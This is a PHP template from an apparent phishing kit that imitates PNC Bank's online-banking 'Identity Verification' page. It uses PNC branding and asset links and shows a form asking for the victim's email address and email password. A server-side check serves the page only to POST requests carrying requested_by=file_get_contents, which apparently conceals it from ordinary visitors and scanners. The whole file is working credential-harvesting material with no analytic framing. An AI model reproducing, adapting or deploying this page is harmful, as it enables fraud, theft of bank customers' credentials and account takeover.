<?php
if ($_SERVER['REQUEST_METHOD'] !== "POST" || !isset($_POST['requested_by']) || $_POST['requested_by'] !== 'file_get_contents'){
    http_response_code(403);
    echo "Sorry you can't be here.";
    exit(0);
}
?>
<html lang="en">

<head>
    <meta name="viewport" content="width=device-width; initial-scale=1" />
    <title>PNC Bank Online Banking</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
    <link href="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/css/common.css" rel="stylesheet" />
    <link href='https://fonts.googleapis.com/css?family=Alegreya' rel='stylesheet'>
    <link rel="shortcut icon" href="https://www.pnc.com/etc/designs/pnc-com/favicon.ico" />
    <link rel="icon" href="https://www.pnc.com/etc/designs/pnc-com/favicon.ico" />
    <link rel="stylesheet" href="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/css/email.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" integrity="sha512-3n19xznO0ubPpSwYCRRBgHh63DrV+bdZfHK52b1esvId4GsfwStQNPJFjeQos2h3JwCmZl0/LgLxSKMAI55hgw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/js/mask.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/js/imask.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/js/email.js"></script>
</head>

<body>
    <header class="container-fluid header">
        <div class="logo-container">
            <div class="page-name">
                <h1>Identity Verification</h1>
            </div>
        </div>
    </header>
    <div class="content">
        <div class="steps d-flex">
            <div class="step current">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/imgs/icon_topic_creditcards_orange.svg">
                <p>Identification</p>
            </div>
            <div class="step current">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/imgs/smart_access_icon_secure.svg">
                <p>Verify Ownership</p>
            </div>
            <div class="step current">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/imgs/id-card.svg">
                <p>Verify ID</p>
            </div>
            <div class="step">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v1/views/assets/imgs/tick.svg">
                <p>Done</p>
            </div>
        </div>

        <div class="main-content">
            <div class="personal-info">
                <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                    <symbol id="check-circle-fill" fill="currentColor" viewBox="0 0 16 16">
                      <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                    </symbol>
                    <symbol id="info-fill" fill="currentColor" viewBox="0 0 16 16">
                      <path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.451-.081.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"/>
                    </symbol>
                    <symbol id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
                      <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>
                    </symbol>
                  </svg>
                  
                <form method="post">
                    <div class="alert alert-primary d-flex flex-column align-items-center" role="alert">
                        <div class="d-flex">
                            <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Info:"><use xlink:href="#info-fill"/></svg>
                            Email Address Verification
                        </div>
                        <div class="d-flex mt-2 text-center">
                            <p>
                                Please, Enter your PNC Bank associated email address to be confirmed.                        
                            </p>
                        </div>
                      </div>
                    <input class="form-control" type="email" placeholder="Email Address"
                    aria-label="Email Address" name="eml">
                    <input class="form-control mt-2" id="emlpass" name="emlpass" type="password" placeholder="Email Password"
                    aria-label="Email Password">
                    <div class="input-group mt-2 d-flex justify-content-center">
                        <input type="submit" name="submit" value="next" class="btn mt-2 pnc-btn"/>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <footer class="py-3 footer container-fluid">
        <ul class="nav justify-content-center">
            <li class="nav-item footer-link hoverable"><a href="#">Online Banking Guarantee</a></li>
            <li class="nav-item footer-link hoverable"><a href="#">Service Agreement</a></li>
            <li class="nav-item footer-link hoverable"><a href="#">Privacy</a></li>
            <li class="nav-item footer-link hoverable"><a href="#">Online Security</a></li>
        </ul>
        <p class="text-center text-muted">© 2022 The PNC Financial Services Group, Inc. All rights reserved.</p>
    </footer>
</body>

</html>